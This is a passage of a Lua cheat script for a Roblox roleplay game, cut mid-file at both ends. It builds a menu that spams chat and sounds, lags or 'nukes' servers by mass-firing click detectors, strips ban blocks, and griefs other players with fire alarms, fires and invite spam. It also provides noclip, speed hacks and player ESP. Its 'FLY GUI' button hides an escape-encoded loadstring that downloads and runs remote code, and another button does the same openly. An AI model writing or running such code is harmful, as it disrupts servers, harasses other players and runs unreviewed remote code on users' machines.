TabSound:AddParagraph({"SNIPER REQUIREMENT WARNING", "You must have the Sniper equipped in your hand for the sounds to work. If it stays in your backpack, nothing will happen."})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter custom audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue ~= "" then
        fireSniperRemote(SoundIdValue)
    end
end})

TabSound:AddTextBox({
    Name = "LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            textboxCooldownValue = num 
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP SOUND",
    Default = false,
    Callback = function(state)
        LoopTextboxEnabled = state
        if LoopTextboxEnabled then
            task.spawn(function()
                if not textboxCooldownValue then 
                    textboxCooldownValue = 0.2 
                end
                
                while LoopTextboxEnabled and SoundIdValue ~= "" do
                    fireSniperRemote(SoundIdValue)
                    task.wait(textboxCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SoundIdValue ~= "" then
        runAudioAllSystem(SoundIdValue)
    end
end})

TabSound:AddSection({"Preset FE Sounds"})

TabSound:AddDropdown({
    Name = "SELECT PRESET AUDIO",
    Description = "Choose a preset sound effect",
    Options = DropdownOptions,
    Default = "GET OUT",
    Callback = function(selected)
        SelectedDropdownAudio = selected
    end
})

TabSound:AddButton({"PLAY PRESET SOUND", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then fireSniperRemote(id) end
    end
end})

TabSound:AddTextBox({
    Name = "PRESET LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            DropdownCooldownValue = num
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP PRESET SOUND",
    Default = false,
    Callback = function(state)
        LoopDropdownEnabled = state
        if LoopDropdownEnabled then
            task.spawn(function()
                while LoopDropdownEnabled and SelectedDropdownAudio ~= "" do
                    local id = PresetAudios[SelectedDropdownAudio]
                    if id then 
                        fireSniperRemote(id) 
                    end
                    task.wait(DropdownCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then runAudioAllSystem(id) end
    end
end})

-- TAB CHAT
do
    local TabChat = Window:MakeTab({"CHAT", "message-square"})

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TextChatService = game:GetService("TextChatService")

    local ChatMessageValue = ""
    local SpamChatEnabled = false
    local SpamCooldownValue = 0.5

    TabChat:AddSection({"Chat Spammer"})

    TabChat:AddTextBox({
        Name = "MESSAGE",
        Description = "Enter message to spam",
        PlaceholderText = "Type message here...",
        Callback = function(value)
            ChatMessageValue = tostring(value)
        end
    })

    TabChat:AddTextBox({
        Name = "SPAM COOLDOWN",
        Description = "Set interval in seconds",
        PlaceholderText = "0.5",
        Callback = function(value)
            local num = tonumber(value)
            if num and num > 0 then
                SpamCooldownValue = num
            end
        end
    })

    TabChat:AddToggle({
        Name = "SPAM CHAT",
        Default = false,
        Callback = function(state)
            SpamChatEnabled = state
            if SpamChatEnabled then
                task.spawn(function()
                    while SpamChatEnabled and ChatMessageValue ~= "" do
                        pcall(function()
                            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                                if channel then
                                    channel:SendAsync(ChatMessageValue)
                                end
                            else
                                local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                                if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
                                    chatEvents.SayMessageRequest:FireServer(ChatMessageValue, "All")
                                end
                            end
                        end)
                        task.wait(SpamCooldownValue)
                    end
                end)
            end
        end
    })
end

-- TAB PLAYER
local Tab6 = Window:MakeTab({"PLAYER", "user"})

local SectionBasic = Tab6:AddSection({"Basic Functions"})

Tab6:AddButton({"FLY GUI", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\105\119\105\57\57\57\45\98\108\105\112\47\77\114\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\82\69\65\68\77\69\46\109\100\34\41\41\40\41")()
end})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer

local SPIN_ENABLED = false
local SPIN_CONN = nil
local SPIN_SPEED = 90

local WALK_SPEED = 30
local JUMP_POWER = 60
local GRAVITY_VALUE = Workspace.Gravity or 196.2

local function getCharacterAndHumanoid()
    local char = LP.Character
    if not char then return nil, nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    return char, hum
end

local function startSpin()
    if SPIN_ENABLED then return end
    SPIN_ENABLED = true
    if SPIN_CONN then pcall(function() SPIN_CONN:Disconnect() end) end
    SPIN_CONN = RunService.Heartbeat:Connect(function(dt)
        if not SPIN_ENABLED then return end
        local char = LP.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local angleRad = math.rad(SPIN_SPEED * dt)
            pcall(function()
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, angleRad, 0)
            end)
        end
    end)
end

local function stopSpin()
    SPIN_ENABLED = false
    if SPIN_CONN then
        pcall(function() SPIN_CONN:Disconnect() end)
        SPIN_CONN = nil
    end
end

local function SPIN(on)
    if on == nil then
        if SPIN_ENABLED then stopSpin() else startSpin() end
    else
        if on then startSpin() else stopSpin() end
    end
end

LP.CharacterAdded:Connect(function(char)
    task.defer(function()
        local hum = char:WaitForChild("Humanoid", 5) or char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.WalkSpeed = WALK_SPEED end)
            pcall(function() hum.JumpPower = JUMP_POWER end)
        end
        if SPIN_ENABLED then
            startSpin()
        end
    end)
end)

Tab6:AddToggle({
    Name = "SPIN",
    Default = false,
    Callback = function(state)
        SPIN(state)
    end
})

Tab6:AddTextBox({
    Name = "SPIN SPEED (deg/s)",
    Description = "Set turning rotation speed",
    PlaceholderText = "90",
    Callback = function(text)
        local n = tonumber(text)
        if n then SPIN_SPEED = n end
    end
})

Tab6:AddSlider({
    Name = "WALK SPEED",
    Min = 16,
    Max = 300,
    Default = WALK_SPEED,
    Increase = 1,
    Callback = function(value)
        WALK_SPEED = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.WalkSpeed = WALK_SPEED end
    end
})

Tab6:AddSlider({
    Name = "JUMP POWER",
    Min = 50,
    Max = 400,
    Default = JUMP_POWER,
    Increase = 1,
    Callback = function(value)
        JUMP_POWER = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.JumpPower = JUMP_POWER end
    end
})

Tab6:AddSlider({
    Name = "GRAVITY",
    Min = 0,
    Max = 196,
    Default = math.floor(GRAVITY_VALUE),
    Increase = 1,
    Callback = function(value)
        GRAVITY_VALUE = value
        Workspace.Gravity = GRAVITY_VALUE
    end
})

local noclipEnabled = false
local noclipConn = nil

local function startNoClip()
    if noclipEnabled then return end
    noclipEnabled = true

    noclipConn = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function() part.CanCollide = false end)
                end
            end
        end
    end)
end

local function stopNoClip()
    if not noclipEnabled then return end
    noclipEnabled = false
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
end

Tab6:AddToggle({
    Name = "NOCLIP",
    Default = false,
    Callback = function(val)
        if val then startNoClip() else stopNoClip() end
    end
})

-- TAB PROTECTIONS
do
    local TabProtections = Window:MakeTab({"PROTECTIONS", "shield"})

    TabProtections:AddToggle({
        Name = "ANTI SIT",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Seat") or v:IsA("VehicleSeat") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiSeatLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Seat") or v:IsA("VehicleSeat") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiSeatLoop then
                    getgenv().AntiSeatLoop:Disconnect()
                    getgenv().AntiSeatLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI VOID",
        Default = false,
        Callback = function(state)
            if state then
                getgenv().AntiVoidLoop = game:GetService("RunService").Heartbeat:Connect(function()
                    pcall(function()
                        local hrp = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if hrp and hrp.Position.Y <= -450 then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            hrp.CFrame = CFrame.new(0, 50, 0)
                        end
                    end)
                end)
            else
                if getgenv().AntiVoidLoop then
                    getgenv().AntiVoidLoop:Disconnect()
                    getgenv().AntiVoidLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI BANANA",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiBananaLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiBananaLoop then
                    getgenv().AntiBananaLoop:Disconnect()
                    getgenv().AntiBananaLoop = nil
                end
            end
        end
    })
end

-- ==========================================
-- TAB TOOLS/NUKES
-- ==========================================
local TabItem = Window:MakeTab({"TOOLS/NUKES", "hammer"})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

local NukeEnabled = false
local SelectedNuke = "LAG SERVER (BOMB)"
local NukeThread
local LastUnequip = 0

local function FindObject(name)
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name:lower() == name:lower() then
            return v
        end
    end
end

local function UnequipAllTools()
    local char = LP.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:UnequipTools()
    end
end

local function TeleportAndSpam(obj)
    if not obj or not NukeEnabled then return end

    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
    if cd then
        if obj:IsA("Model") then
            hrp.CFrame = obj:GetModelCFrame()
        elseif obj:IsA("BasePart") then
            hrp.CFrame = obj.CFrame
        end

        local startTime = tick()
        while NukeEnabled and obj and cd and (tick() - startTime < 1.5) do
            for i = 1, 25 do
                if not NukeEnabled then break end
                fireclickdetector(cd)
            end
            if not NukeEnabled then break end
            RunService.Heartbeat:Wait()
        end
    end
end

local function StopNuke()
    NukeEnabled = false
    if NukeThread then
        task.cancel(NukeThread)
        NukeThread = nil
    end
end

local function MainLoop(typeName)
    while NukeEnabled and SelectedNuke == typeName do
        if SelectedNuke:find("LAG SERVER") then
            if tick() - LastUnequip >= 67 then
                LastUnequip = tick()
                UnequipAllTools()
            end
        end

        if not NukeEnabled then break end

        if typeName == "LAG SERVER (BOMB)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Bomb")) end
        elseif typeName == "LAG SERVER (SNIPER)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Sniper")) end
        elseif typeName == "NUKE SERVER(FLASH LIGHT)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Toolsflashlight")) end
        end

        if not NukeEnabled then break end
        RunService.Heartbeat:Wait()
    end
end

local function StartNuke()
    StopNuke()
    NukeEnabled = true
    LastUnequip = tick()

    NukeThread = task.spawn(function()
        MainLoop(SelectedNuke)
    end)
end

-- ================= DROPDOWN LAG TYPE =================
TabItem:AddDropdown({
    Name = "LAG TYPE",
    Description = "Select the execution method",
    Options = {
        "LAG SERVER (BOMB)",
        "LAG SERVER (SNIPER)",
        "NUKE SERVER(FLASH LIGHT)"
    },
    Default = "LAG SERVER (BOMB)",
    Callback = function(v)
        SelectedNuke = v
    end
})

-- ================= TOGGLE EXECUTE =================
TabItem:AddToggle({
    Name = "ENABLE NUKE / LAG",
    Default = false,
    Callback = function(state)
        if state then
            StartNuke()
        else
            StopNuke()
        end
    end
})

-- ================= PARAGRAPH INFO =================
TabItem:AddParagraph({"WARNING", "To use the FLASHLIGHT NUKE, you must own House 056 (the Haunted House). The nuke will not work without this house."})

--================================================================================
-- TOOLS FODA
--================================================================================

_G.RGB_Speed = 1
_G.RGB_PaintActive = false
_G.RGB_TorchActive = false

TabItem:AddSection({"TOOLS"})

-- TEXTBOX FOR SPEED
TabItem:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle velocity",
	PlaceholderText = "1",
	Callback = function(Value)
        local n = tonumber(Value)
        if n then _G.RGB_Speed = n end
	end	  
})

-- PAINT ROLLER
TabItem:AddButton({"GET PAINT ROLLER", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PaintRoller")
end})

TabItem:AddToggle({
	Name = "PAINT ROLLER RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_PaintActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_PaintActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- GUARD TORCH
TabItem:AddButton({"GET TORCH", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "GuardTorch")
end})

TabItem:AddToggle({
	Name = "TORCH RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_TorchActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_TorchActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- ================= AUTO GIVE TORCH =================
local RS = game:GetService("ReplicatedStorage")
local pizzaLoop = false
local pizzaConn = nil
local RANGE = 2000

local function getNearbyPlayers()
    local nearby = {}
    if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then
        return nearby
    end

    local myPos = LP.Character.HumanoidRootPart.Position

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist <= RANGE then
                table.insert(nearby, plr)
            end
        end
    end
    return nearby
end

local function givePizza(player)
    local args = {
        "ToolGiveToServer",
        player,
        "GuardTorch"
    }

    RS:WaitForChild("RE")
      :WaitForChild("1Playe1rTrigge1rEven1t")
      :FireServer(unpack(args))
end

TabItem:AddToggle({
    Name = "AUTO GIVE TORCH (15 STUDS)",
    Default = false,
    Callback = function(state)
        pizzaLoop = state

        if pizzaConn then
            pizzaConn:Disconnect()
            pizzaConn = nil
        end

        if state then
            pizzaConn = RunService.Heartbeat:Connect(function()
                for _, plr in ipairs(getNearbyPlayers()) do
                    pcall(function()
                        givePizza(plr)
                    end)
                end
                task.wait(0.25)
            end)
        end
    end
})

-- ==========================================
-- TAB HOUSES
-- ==========================================
local TabHouse = Window:MakeTab({"HOUSES", "home"})

-- REMOVE HOUSE BAN (DELETA O BLOCO)
TabHouse:AddButton({"REMOVE HOUSE BAN", function()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name == "BannedBlock" then
			obj:Destroy()
		end
	end
end})

-- AUTO REMOVE BAN
TabHouse:AddToggle({
	Name = "AUTO REMOVE BAN",
	Default = false,
	Callback = function(Value)
		_G.AutoUnbanActive = Value
		if Value then
			_G.BanMonitor = workspace.DescendantAdded:Connect(function(obj)
				if _G.AutoUnbanActive and obj.Name == "BannedBlock" then
					obj:Destroy()
				end
			end)
		else
			if _G.BanMonitor then _G.BanMonitor:Disconnect() end
		end
	end    
})

-- =========================
-- RGB CASA LOGIC
-- =========================
local RGBHouseSettings = {
    Speed = 1,
    States = {}
}

local function GetHouseRGBColor()
    local hue = tick() * RGBHouseSettings.Speed % 5 / 5
    return Color3.fromHSV(hue, 1, 1)
end

local function StartHouseRGBEffect(config)
    RGBHouseSettings.States[config.StateKey] = true
    task.spawn(function()
        while RGBHouseSettings.States[config.StateKey] do
            if not (game.Players.LocalPlayer and game.Players.LocalPlayer.Parent) then
                RGBHouseSettings.States[config.StateKey] = false
                break
            end
            pcall(config.Action)
            task.wait(config.Delay)
        end
    end)
end

TabHouse:AddSection({"RGB HOUSE"})

TabHouse:AddToggle({
    Name = "RGB HOUSE",
    Default = false,
    Callback = function(enabled)
        if enabled then
            StartHouseRGBEffect({
                StateKey = "house",
                Delay = 0.1,
                Action = function()
                    local color = GetHouseRGBColor()
                    pcall(function()
                        game.ReplicatedStorage.RE["1Player1sHous1e"]:FireServer("ColorPickHouse", color)
                    end)
                end
            })
        else
            RGBHouseSettings.States["house"] = false
        end
    end
})

TabHouse:AddTextBox({
    Name = "RGB SPEED",
    Description = "Set house rainbow transition velocity",
    PlaceholderText = "1",
    Callback = function(value)
        local speed = tonumber(value)
        if speed and speed > 0 then
            RGBHouseSettings.Speed = speed
        end
    end
})

-- ==========================================
-- TAB FUN
-- ==========================================
local TabFun = Window:MakeTab({"FUN", "smile"})

LoopConvitesEnabled = false

local function getHRP()
	local char = LP.Character or LP.CharacterAdded:Wait()
	return char:WaitForChild("HumanoidRootPart")
end

local function findBasePart(inst)
	if inst:IsA("BasePart") then return inst end
	for _, d in ipairs(inst:GetDescendants()) do
		if d:IsA("BasePart") then
			return d
		end
	end
end

local function getCFrame(obj)
	if obj:IsA("Model") then
		if obj.PrimaryPart then
			return obj.PrimaryPart.CFrame
		end
		local part = obj:FindFirstChildWhichIsA("BasePart", true)
		if part then return part.CFrame end
	elseif obj:IsA("BasePart") then
		return obj.CFrame
	end
end

local function getAllHighers()
	local list = {}
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name:lower() == "higher" then
			table.insert(list, obj)
		end
	end
	return list
end

local function click30(obj)
	local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
	if not cd then return end
	for i = 1, 30 do
		fireclickdetector(cd)
		task.wait(0.04)
	end
end

--================================================================================
-- COMMERCIAL ADVERTISER
--================================================================================
TabFun:AddButton({"RED BLACK COMMUNITY MESSAGE", function()
    local hrp = getHRP()
    if not hrp then return end

    local originalPos = hrp.CFrame

    hrp.CFrame = CFrame.new(-239, 89.5, -548)
    task.wait(0.6)

    local RE_Cemetery = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y")

    pcall(function()
        RE_Cemetery:FireServer("ReturningCommercialWords", 3, nil, "RED BLACK COMMUNITY ON TOP")
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialWordColor", 3, Color3.new(1, 0, 0.0357508659362793))
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialBackGround", 3, Color3.new(0, 0, 0))
    end)

    task.wait(0.4)
    hrp.CFrame = originalPos
end})

-- =========================================================
-- CHAOS BUTTON
-- =========================================================
TabFun:AddButton({"FIRE IN ALL RESTAURANTS", function()
	local hrp = getHRP()
	local originalCFrame = hrp.CFrame

	for _, higher in ipairs(getAllHighers()) do
		local cf = getCFrame(higher)
		if cf then
			hrp.CFrame = cf * CFrame.new(0, 2, 0)
			task.wait(0.25)

			click30(higher)
			task.wait(0.25)
		end
	end

	hrp.CFrame = originalCFrame
end})

-- =========================
-- SCHOOL FIRE ALARM ALERT
-- =========================
TabFun:AddButton({"SCHOOL FIRE ALARM ALERT", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:find("FireAlarmClicker") then
            local clickDetector = obj:FindFirstChildWhichIsA("ClickDetector")
            if clickDetector then
                local targetCFrame = nil
                if obj:IsA("Model") then
                    if obj.PrimaryPart then
                        targetCFrame = obj.PrimaryPart.CFrame
                    else
                        local part = obj:FindFirstChildWhichIsA("BasePart")
                        if part then targetCFrame = part.CFrame end
                    end
                elseif obj:IsA("BasePart") then
                    targetCFrame = obj.CFrame
                end

                if targetCFrame then
                    hrp.CFrame = targetCFrame + Vector3.new(0, 3, 0)
                    task.wait(0.1)
                    fireclickdetector(clickDetector)
                    task.wait(0.2)
                end
            end
        end
    end

    hrp.CFrame = originalCFrame
end})

-- =========================
-- LIGHT SWITCH FUCKER
-- =========================
TabFun:AddButton({"TURN OFF ALL SWITCHES", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:lower():find("lightswitch") then
            local click = obj:FindFirstChildWhichIsA("ClickDetector", true)
            if click then
                local part = findBasePart(click.Parent)
                if part then
                    hrp.CFrame = part.CFrame
                    task.wait(1)

                    fireclickdetector(click)    
                    task.wait(0.1)    
                    fireclickdetector(click)    
                end    
            end    
        end    
    end    

    hrp.CFrame = originalCFrame
end})

-- =========================================================
-- LOOP DE CONVITES IRRITAR
-- =========================================================
TabFun:AddToggle({
    Name = "INVITATION LOOP ALL",
    Default = false,
    Callback = function(state)
        LoopConvitesEnabled = state
        
        if LoopConvitesEnabled then
            task.spawn(function()
                while LoopConvitesEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LP and LoopConvitesEnabled then
                            pcall(function()
                                local args = {
                                    "HouseParty",
                                    {
                                        player.UserId
                                    }
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("StartFreeParty"):FireServer(unpack(args))
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    end
})

-- ==========================================
-- TAB VISUAL
-- ==========================================
local TabESP = Window:MakeTab({"VISUAL", "eye"})

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- ==========================================
-- ESP FOLDERS
-- ==========================================
local espFolder = CoreGui:FindFirstChild("RBH_ESP_Billboards") or Instance.new("Folder", CoreGui)
espFolder.Name = "RBH_ESP_Billboards"

local highlightFolder = CoreGui:FindFirstChild("RBH_Highlights") or Instance.new("Folder", CoreGui)
highlightFolder.Name = "RBH_Highlights"

-- ==========================================
-- STATE
-- ==========================================
local espEnabled = false
local activeSchemeKey = "red"
local playerESP = {}
local playerAddedConn, playerRemovingConn

-- ==========================================
-- COLOR SCHEMES
-- ==========================================
local COLOR_SCHEMES = {
    red       = {hl = Color3.fromRGB(255,0,0),     name = Color3.fromRGB(255,255,255)},
    yellow    = {hl = Color3.fromRGB(255,215,0),   name = Color3.fromRGB(0,0,0)},
    blue      = {hl = Color3.fromRGB(0,150,255),   name = Color3.fromRGB(255,255,255)},
    green     = {hl = Color3.fromRGB(0,255,128),   name = Color3.fromRGB(0,0,0)},
    white     = {hl = Color3.fromRGB(255,255,255), name = Color3.fromRGB(0,0,0)},
    black     = {hl = Color3.fromRGB(0,0,0),       name = Color3.fromRGB(255,255,255)},
    brown     = {hl = Color3.fromRGB(139,69,19),   name = Color3.fromRGB(255,255,255)},
    darkgreen = {hl = Color3.fromRGB(0,100,0),     name = Color3.fromRGB(255,255,255)},
    purple    = {hl = Color3.fromRGB(128,0,128),   name = Color3.fromRGB(255,255,255)},
    magenta   = {hl = Color3.fromRGB(255,0,255),   name = Color3.fromRGB(255,255,255)}
}

local highlightColor = COLOR_SCHEMES.red.hl
local nameColor = COLOR_SCHEMES.red.name

-- ==========================================
-- ESP CORE
-- ==========================================
local function clearESP(player)
    if playerESP[player] then
        if playerESP[player].highlight then playerESP[player].highlight:Destroy() end
        if playerESP[player].billboard then playerESP[player].billboard:Destroy() end
        playerESP[player] = nil
    end
end

local function createESP(player)
    if player == LocalPlayer or not player.Character then return end
    clearESP(player)

    local char = player.Character

    -- Highlight
    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillColor = highlightColor
    highlight.OutlineColor = highlightColor
    highlight.FillTransparency = 0.75
    highlight.OutlineTransparency = 0
    highlight.Parent = highlightFolder

    -- Billboard
    local adornee = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
    local billboard
    if adornee then
        billboard = Instance.new("BillboardGui")
        billboard.Adornee = adornee
        billboard.Size = UDim2.new(0,200,0,30)
        billboard.StudsOffset = Vector3.new(0,2.5,0)
        billboard.AlwaysOnTop = true
        billboard.Parent = espFolder

        local txt = Instance.new("TextLabel", billboard)
        txt.Size = UDim2.new(1,0,1,0)
        txt.BackgroundTransparency = 1
        txt.Text = player.DisplayName .. " | " .. player.Name
        txt.TextColor3 = nameColor
        txt.TextStrokeTransparency = 0.6
        txt.Font = Enum.Font.GothamBold
        txt.TextSize = 14
    end

    playerESP[player] = {
        highlight = highlight,
        billboard = billboard
    }
end

local function enableESP()
    espEnabled = true
    for _, plr in ipairs(Players:GetPlayers()) do
        createESP(plr)
    end

    playerAddedConn = Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function()
            task.wait(0.2)
            if espEnabled then createESP(plr) end
        end)
    end)

    playerRemovingConn = Players.PlayerRemoving:Connect(clearESP)
end

local function disableESP()
    espEnabled = false
    for plr in pairs(playerESP) do
        clearESP(plr)
    end
    if playerAddedConn then playerAddedConn:Disconnect() end
    if playerRemovingConn then playerRemovingConn:Disconnect() end
end

local function updateColors()
    for _, data in pairs(playerESP) do
        if data.highlight then
            data.highlight.FillColor = highlightColor
            data.highlight.OutlineColor = highlightColor
        end
        if data.billboard and data.billboard:FindFirstChildOfClass("TextLabel") then
            data.billboard.TextLabel.TextColor3 = nameColor
        end
    end
end

local function setScheme(key)
    local scheme = COLOR_SCHEMES[key]
    if not scheme then return end
    highlightColor = scheme.hl
    nameColor = scheme.name
    activeSchemeKey = key
    if espEnabled then updateColors() end
end

-- ================= VISUAL UI ELEMENTS =================

TabESP:AddButton({"SHADERS 4K", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/SHADERS-4K-V1/refs/heads/main/Omaga"))()
end})

TabESP:AddDropdown({
    Name = "ESP COLOR",
    Description = "Select target outline color",
    Options = {
        "RED","YELLOW","BLUE","GREEN","WHITE",
        "BLACK","BROWN","DARKGREEN","PURPLE","MAGENTA"
    },
    Default = "RED",
    Callback = function(v)
        setScheme(string.lower(v))
    end
})

TabESP:AddToggle({
    Name = "ENABLE ESP",
    Default = false,
    Callback = function(state)
        if state then enableESP() else disableESP() end
    end
})

-- ================= SAFE PROP ESP + COLOR =================
do
	local RunService = game:GetService("RunService")

	local enabled = false
	local objects = {}
	local renderConn
	local addConn

	local PROP_COLORS = {
		red     = Color3.fromRGB(255,0,0),
		yellow  = Color3.fromRGB(255,215,0),
		blue    = Color3.fromRGB(0,150,255),
		green   = Color3.fromRGB(0,255,128),
		white   = Color3.fromRGB(255,255,255),
		black   = Color3.fromRGB(0,0,0),
		purple  = Color3.fromRGB(128,0,128),
		magenta = Color3.fromRGB(255,0,255)
	}

	local currentColor = PROP_COLORS.red

	local function updateColor()
		for _,v in pairs(objects) do
			if v.H then
				v.H.FillColor = currentColor
				v.H.OutlineColor = currentColor
			end
		end
	end

	local function valid(model)
		if not model:IsA("Model") then return false end
		if model.Name:sub(1,4) ~= "Prop" then return false end

		local nick = model.Name:sub(5)
		if nick == "" then return false end

		return Players:FindFirstChild(nick) ~= nil
	end

	local function create(model)
		if objects[model] then return end
		if not valid(model) then return end

		local part = model:FindFirstChildWhichIsA("BasePart")
		if not part then return end

		local h = Instance.new("Highlight")
		h.FillColor = currentColor
		h.OutlineColor = currentColor
		h.FillTransparency = 0.35
		h.Parent = model

		local bb = Instance.new("BillboardGui")
		bb.Size = UDim2.new(0,200,0,50)
		bb.AlwaysOnTop = true
		bb.Adornee = part
		bb.Parent = model

		local txt = Instance.new("TextLabel")
		txt.Size = UDim2.new(1,0,1,0)
		txt.BackgroundTransparency = 1
		txt.TextScaled = true
		txt.TextColor3 = Color3.new(1,1,1)
		txt.TextStrokeTransparency = 0
		txt.Parent = bb

		objects[model] = {H = h, B = bb, T = txt}
	end

	local function clear()
		for m,v in pairs(objects) do
			if v.H then v.H:Destroy() end
